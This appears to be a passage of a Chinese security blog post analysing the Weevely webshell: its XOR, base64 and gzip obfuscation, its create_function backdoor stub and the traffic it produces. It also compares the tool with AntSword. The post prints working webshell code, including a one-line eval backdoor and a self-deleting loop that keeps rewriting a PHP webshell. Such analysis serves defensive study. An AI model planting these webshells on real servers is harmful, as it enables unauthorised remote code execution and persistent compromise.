+</blockquote>
+<p>异或：主要用来判断两个值是否不同</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">原始版本
+</span></span><span class="line"><span class="cl">0 ^ 0 = 0 
+</span></span><span class="line"><span class="cl">0 ^ 1 = 1 
+</span></span><span class="line"><span class="cl">1 ^ 0 = 1 
+</span></span><span class="line"><span class="cl">1 ^ 1 = 0 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">字符版本
+</span></span><span class="line"><span class="cl">a ^ b ^ c ^ a ^ b 
+</span></span><span class="line"><span class="cl">= a ^ a ^ b ^ b ^ c 
+</span></span><span class="line"><span class="cl">= 0 ^ 0 ^ c 
+</span></span><span class="line"><span class="cl">= c
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>文本串行的每个字符可以通过<strong>与给定的密钥</strong>进行 <strong>按位异或运算</strong>来加密。
+如果要解密，只需要将加密后的结果与密钥再次 进行按位异或运算即可。</p>
+<p>举例：</p>
+<p><img src="/post_4/pics/xor.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<ul>
+<li>第一次异或结果：string(10) &ldquo;一串乱码（bushi）&rdquo;</li>
+<li>第二次异或结果：string(10) &ldquo;wild wagei&rdquo;</li>
+</ul>
+<h2 id="剩下的">剩下的
+</h2><ol>
+<li>@gzuncompress: 用于解压缩经过gzip压缩的字符串。</li>
+<li>@base64_decode: 用于对经过base64编码的数据进行解码。</li>
+<li>@base64_encode:对数据进行base64编码。</li>
+</ol>
+<h1 id="第二部分">第二部分
+</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;cDrDeDaDDte_fuDnction&#39;</span><span class="p">);</span><span class="c1">//替换之后得到create_function
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$b</span><span class="o">=</span><span class="nv">$d</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$A</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><em><strong><code>create_function</code></strong></em> 是 PHP 中的一个函数，用于动态创建一个匿名函数（lambda 函数）。</p>
+<p>通过 **<em><code>create_function**</code></em> 函数，可以根据传入的参数和代码字符串创建一个匿名函数，并返回一个唯一的函数名。</p>
+<p>查了一下<a class="link" href="https://www.php.net/manual/en/function.create-function.php%EF%BC%89%EF%BC%8C%E5%86%99%E4%BA%86%E4%B8%80%E4%B8%AAdemo%E8%BF%9B%E8%A1%8C%E7%90%86%E8%A7%A3"  target="_blank" rel="noopener"
+    >官方手册</a>，写了一个demo进行理解</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$newfunc</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="s1">&#39;echo &#34;Hello, World!&#34;;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$newfunc</span><span class="p">();</span> <span class="c1">// 输出 Hello, World!
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="nv">$func</span> <span class="o">=</span> <span class="nx">create_function</span><span class="p">(</span><span class="s1">&#39;$arg1, $arg2&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$func</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span> <span class="c1">// 这个调用不会执行任何操作，因为函数体为空
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以第一部分就是：</p>
+<ol>
+<li>替换之后得到create_function</li>
+<li><code>$A</code>作为函数体进行执行</li>
+<li>结果存入<code>$b</code></li>
+<li><code>$b</code>执行</li>
+</ol>
+<h1 id="weevelt-code">Weevelt code
+</h1><p><img src="/post_4/pics/code.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="weevley code catalog"
+	
+	
+></p>
+<ul>
+<li>bd：提供后门代码生成模板</li>
+<li>core：核心生成与连接处理代码</li>
+<li>modules：可运行指令的处理模板</li>
+<li>utills：没看</li>
+<li>weevely.py：index文件</li>
+</ul>
+<br>
+<p>通读是不可能的，所以使用报错找到调用链——修改了生成的后门文件进行连接操作
+…………</p>
+<p><img src="/post_4/pics/error.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="error"
+	
+	
+></p>
+<p>所以就在图上了。</p>
+<p>下面直接写重点函数</p>
+<hr>
+<h2 id="加密obfpostpy">加密obfpost.py
+</h2><h3 id="__init__self-url-password"><code>__init__(self, url, password)</code>
+</h3><p><img src="/post_4/pics/obpost1.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="obfpost1"
+	
+	
+></p>
+<p>将得到的密码参数进行md5，十六进制、小写处理后，得到一个32位的”乱码“</p>
+<ul>
+<li>前8位作为<code>shared_key</code></li>
+<li>中间12位作为<code>header</code></li>
+<li>最后12位作为<code>trailer</code></li>
+</ul>
+<p>所以按照这个思路写一个demo</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">password</span> <span class="o">=</span> <span class="s1">&#39;smart&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">passwordhash</span> <span class="o">=</span> <span class="n">haslib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">password</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">shared_key</span> <span class="o">=</span> <span class="n">passwordhash</span><span class="p">[:</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">header</span> <span class="o">=</span> <span class="n">passwordhash</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">20</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">trailer</span> <span class="o">=</span> <span class="n">passwordhash</span><span class="p">[</span><span class="mi">20</span><span class="p">:</span><span class="mi">32</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>得到的结果是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">passwordhash: 8c319f28d81d1527a9428e9a5c2195f5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">shared_key: 8c319f28
+</span></span><span class="line"><span class="cl">header: d81d1527a942
+</span></span><span class="line"><span class="cl">trailer: 8e9a5c2195f5
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>回到最开始的生成的后门文件中，</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$k</span><span class="o">=</span><span class="s2">&#34;8c319f28&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$kh</span><span class="o">=</span><span class="s2">&#34;d81d1527a942&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$kf</span><span class="o">=</span><span class="s2">&#34;8e9a5c2195f5&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span><span class="o">=</span><span class="s2">&#34;ZnCtZbYsDzbbdvRw&#34;</span><span class="p">;</span><span class="c1">//后面会解释是什么
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以发现前三个都对应上了。</p>
+<hr>
+<h3 id="send"><code>send()</code>
+</h3><p><img src="/post_4/pics/ap.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><img src="/post_4/pics/send2.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p>也不算难理解</p>
+<p>不过最后一句是关键，也是整个payload的拆解关键
+<br>
+<br>
+提一下第一张图片中的两句
+<br>
+<br></p>
+<blockquote>
+<p>由字符集<code>string.printable</code> <i>(包含ASCII 可打印 字符的全部字符，即包括数字、大小写字母、 标点符号和空格)</i>中的随机字符组成的长度 为 16 的字符串</p>
+</blockquote>
+<p>简单说就是，<code>PREPEND</code>和<code>APPEND</code>的值都是随机的，长度均为16
+<br>
+<br>
+于是按照第二张图的思路：</p>
+<p><img src="/post_4/pics/fin.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+>
+<br>
+这里的原始payload是<code>@eval(phpinfo())</code>
+<br>
+经过xor、obfuscated、wrappped之后，得到了最后会发送出去的payload。</p>
+<hr>
+<br>
+<p>关于如何发送payload的</p>
+<p><code>opener = urllib.request.build_opener(*additional_handlers)</code>：发送payload并获取响应内容</p>
+<p>获取到的响应又通过</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">response</span> <span class="o">=</span> <span class="n">zlib</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="n">utils</span><span class="o">.</span><span class="n">string</span><span class="o">.</span><span class="n">sxor</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">		<span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">matched</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)),</span>
+</span></span><span class="line"><span class="cl">		<span class="bp">self</span><span class="o">.</span><span class="n">shared_key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进行解码。</p>
+<p>和生成的后门文件一个逻辑。
+所以那边也是，接收到payload后，解码并执行，也就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$d</span><span class="o">=</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;D&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;cDrDeDaDDte_fuDnction&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="o">=</span><span class="nv">$d</span><span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="nv">$A</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这部分的意义。</p>
+<hr>
+<h1 id="流量分析">流量分析
+</h1><h2 id="攻击者发给受害者">攻击者发给受害者
+</h2><p>一个编写好的目录遍历命令：</p>
+<p><img src="/post_4/pics/s-a.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="s-a"
+	
+	
+></p>
+<p>其解码后内容是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;xxx\xx&#39;</span><span class="p">);</span><span class="o">@</span><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$p</span><span class="o">=</span><span class="s2">&#34;.&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$p</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$d</span><span class="o">=@</span><span class="nx">opendir</span><span class="p">(</span><span class="nv">$p</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$a</span><span class="o">=</span><span class="nx">arrray</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span><span class="p">(</span><span class="nv">$d</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">		<span class="k">while</span><span class="p">((</span><span class="nv">$f</span><span class="o">=@</span><span class="nx">readdir</span><span class="p">(</span><span class="nv">$d</span><span class="p">)))</span> <span class="nv">$a</span><span class="p">[]</span><span class="o">=</span><span class="nv">$f</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="nx">sort</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">print</span><span class="p">(</span><span class="nx">join</span><span class="p">(</span><span class="nx">PHP_EOL</span><span class="p">,</span><span class="nv">$a</span><span class="p">));</span>	
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>ps：这个是<code>file_ls</code>功能的代码，不是自己写的。</p>
+<h2 id="受害者发给攻击者">受害者发给攻击者
+</h2><p>于是这是返回过来的信息</p>
+<p><img src="/post_4/pics/a-s.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="s-a"
+	
+	
+></p>
+<p>解码之后得到：</p>
+<p><img src="/post_4/pics/result2.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="s-a"
+	
+	
+></p>
+<hr>
+<br>
+<h1 id="番外1-与antisword的对比easiest-version">番外1-与antisword的对比（easiest version）
+</h1><h2 id="后门文件">后门文件
+</h2><p>antisword的常用后门就是一句话木马系列</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>与weeevely的相比：</p>
+<ol>
+<li>简洁程度不是一倍两倍</li>
+<li>被抓到的容易程度也不是一倍两倍。</li>
+</ol>
+<h2 id="流量分析-1">流量分析
+</h2><p>这是抓取的流量中，antisword发送的代码的部分内容</p>
+<p><img src="/post_4/pics/anti.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<ul>
+<li>流量分析得到antisword发送的 post内容——只是简单的进行了 URL编码</li>
+<li>可以看出来是一个对目录进行遍 历以及获取，最后将数据返回的 代码</li>
+<li>将进行处理的代码在post中传输， 而weevely是将其写入后门文件
+<br>
+<br>
+返回的流量分析：</li>
+</ul>
+<p><img src="/post_4/pics/antire2.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<blockquote>
+<p>截断符号进行获取数据流， 十六进制转换二进制
+<br>
+<br></p>
+</blockquote>
+<p>比起weevely的异或、base64、 gzip，简洁很多</p>
+<br>
+解码后：
+<p><img src="/post_4/pics/antire1.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<hr>
+<br>
+<h2 id="总结">总结
+</h2><p><strong>Weevely</strong>： 完全始祖版本^^</p>
+<br>
+**Antisword**： 
+- 后门文件更友好，同时也很容易被识别 (最基础版本) 
+- 因为后门中没有特别多涉及处理代码， 所以被发现，也顶多知道攻击者通过这 个后门文件得到了什么，而不是得到其 逆向处理逻辑。
+<hr>
+<br>
+<h1 id="番外2-内存马">番外2-内存马
+</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ignore_user_abort</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unlink</span><span class="p">(</span><span class="nx">__FILE___</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$content</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php @eval($_POST[&#34;123&#34;]) ?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">file_put_contents</span><span class="p">(</span><span class="s2">&#34;11.php&#34;</span><span class="p">,</span> <span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">usleep</span><span class="p">(</span><span class="mi">10000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个典型的PHP内存马
+<br>
+<br>
+与前面的木马对比，最大的 特点和优势就是:</p>
+<ol>
+<li>存在于内 存中，不需要文件落地。</li>
+<li>这 也意味着很难被查杀。</li>
+</ol>
+<hr>
+<p>参考</p>
+<p><a class="link" href="https://yaofeifly.github.io/2017/01/13/weevely/"  target="_blank" rel="noopener"
+    >Weevelywebshelll协议分析文档</a><br>
+<a class="link" href="https://salsa.debian.org/pkg-security-team/weevely/-/tree/debian/master?ref_type=heads"  target="_blank" rel="noopener"
+    >weevely  code</a><br>
+<a class="link" href="https://xz.aliyun.com/t/14162?time__1311=mqmx9DBQw%3DY05DI5YK0%3DWS04f2DA2SwD7Kx&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F"  target="_blank" rel="noopener"
+    >蚁剑流量分析</a></p>
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/tool/">TOOL</a>
+        
+            <a href="/tags/%E9%98%85%E8%AF%BB%E4%B8%8E%E5%88%86%E6%9E%90/">阅读与分析</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/b576aef/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">网络是怎样连接的2.0</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/p/5ff6fd0/">
+        
+        
+            <div class="article-image">
+                
+                    <img src="/vulnerable.png" loading="lazy" data-key="5ff6fd0" data-hash="/vulnerable.png"/>
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Halo 0.4.3 审计ing</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/c659435/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件上传 Get</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/64b97cd/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">文件包含</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "How about these days" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2022 - 
+        
+        2024 Real One x86
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
